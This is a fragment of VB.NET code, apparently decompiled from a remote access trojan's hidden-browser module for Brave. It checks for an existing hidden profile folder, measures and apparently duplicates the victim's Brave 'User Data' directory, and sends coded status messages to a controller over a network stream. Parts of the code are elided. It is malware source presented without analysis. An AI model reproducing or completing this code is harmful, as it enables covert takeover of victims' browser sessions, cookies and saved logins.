...
Namespace DLL.Browser
	Public Class Brave
		...
		Public Shared Sub StartBrave(ByVal duplicate As Boolean)
			Try

				' C:\Users\Alex\AppData\Local\BraveSoftware\Brave-Browser\User Data
				If Conversions.ToBoolean(Outils.IsFileOpen(New FileInfo(Interaction.Environ("localappdata") & "\BraveSoftware\Brave-Browser\Waluigi\lockfile"))) Then
					Outils.SendInformation(Outils.nstream, "25|Brave has already been opened!")
					Return
				End If
				If duplicate Then
					Outils.SendInformation(Outils.nstream, "22|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\BraveSoftware\Brave-Browser\User Data")) / 1024.0 / 1024.0)))
					...
					Outils.SendInformation(Outils.nstream, "206|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\BraveSoftware\Brave-Browser\User Data")) / 1024.0 / 1024.0)))
				Else
					Outils.SendInformation(Outils.nstream, "207|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("localappdata") & "\BraveSoftware\Brave-Browser\User Data")) / 1024.0 / 1024.0)))

				End If
				Dim processesByName() As Process = Process.GetProcessesByName("brave")
				...
				stopwatch.[Stop]()
				Dim processesByName2 As Process() = Process.GetProcessesByName("brave")
